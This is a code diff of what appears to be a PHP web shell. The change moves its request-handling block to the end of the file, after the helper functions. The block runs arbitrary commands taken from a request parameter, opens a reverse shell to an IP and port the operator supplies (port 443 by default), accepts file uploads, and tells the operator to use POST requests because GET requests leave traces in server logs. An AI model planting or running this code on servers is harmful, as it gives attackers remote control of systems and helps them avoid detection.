@@ -34,45 +34,6 @@ $ip = 'ip';
 // this parameter.
 $port = 'port';
 
-// warn about noisy get requests
-if ($_SERVER['REQUEST_METHOD'] == 'GET') {
-   echo "\e[0;33mWarning\e[0m: \e[0;31mGET\e[0m requests are most likely logged,";
-   echo " better use \e[0;32mPOST\e[0m instead\n\n";
-}
-
-// test if  parameter 'cmd', 'ip or  'port' is present.
-// if not  this will avoid an  error on logs or  on all
-// pages if badly configured.
-
-if (isset($_REQUEST[$cmd])) {
-   // grab the  command we want  to run from  the 'cmd'
-   // get or  post parameter (post doesn't  display the
-   // command on  apache logs) and notify  on execution
-   // failure
-   if (!executeCommand($_REQUEST[$cmd])) {
-      echo "\e[0;31mError\e[0m: The command failed to run\n";
-   }
-} elseif (isset($_REQUEST[$ip])) {
-   // default port 443
-   $port = isset($_REQUEST[$port])
-      ? $_REQUEST[$port]
-      : '443';
-
-   $ret = openReverseShell($_REQUEST[$ip], $port);
-
-   if ($ret) {
-      echo "\e[0;31mError reverse shell setup\e[0m: ${ret}\n";
-   }
-} elseif (isRequestFileUpload($_FILES[$file])) {
-   $ret = handleFileUpload($_FILES[$file]);
-
-   if ($ret) {
-      echo "\e[0;31mError during upload\e[0m: ${ret}\n";
-   }
-}
-
-die();
-
 /**
  * try to execute a command using various techniques
  *
@@ -189,3 +150,42 @@ function handleFileUpload(array $upload)
 
    return false;
 }
+
+// warn about noisy get requests
+if ($_SERVER['REQUEST_METHOD'] == 'GET') {
+   echo "\e[0;33mWarning\e[0m: \e[0;31mGET\e[0m requests are most likely logged,";
+   echo " better use \e[0;32mPOST\e[0m instead\n\n";
+}
+
+// test if  parameter 'cmd', 'ip or  'port' is present.
+// if not  this will avoid an  error on logs or  on all
+// pages if badly configured.
+
+if (isset($_REQUEST[$cmd])) {
+   // grab the  command we want  to run from  the 'cmd'
+   // get or  post parameter (post doesn't  display the
+   // command on  apache logs) and notify  on execution
+   // failure
+   if (!executeCommand($_REQUEST[$cmd])) {
+      echo "\e[0;31mError\e[0m: The command failed to run\n";
+   }
+} elseif (isset($_REQUEST[$ip])) {
+   // default port 443
+   $port = isset($_REQUEST[$port])
+      ? $_REQUEST[$port]
+      : '443';
+
+   $ret = openReverseShell($_REQUEST[$ip], $port);
+
+   if ($ret) {
+      echo "\e[0;31mError reverse shell setup\e[0m: ${ret}\n";
+   }
+} elseif (isRequestFileUpload($_FILES[$file])) {
+   $ret = handleFileUpload($_FILES[$file]);
+
+   if ($ret) {
+      echo "\e[0;31mError during upload\e[0m: ${ret}\n";
+   }
+}
+
+die();
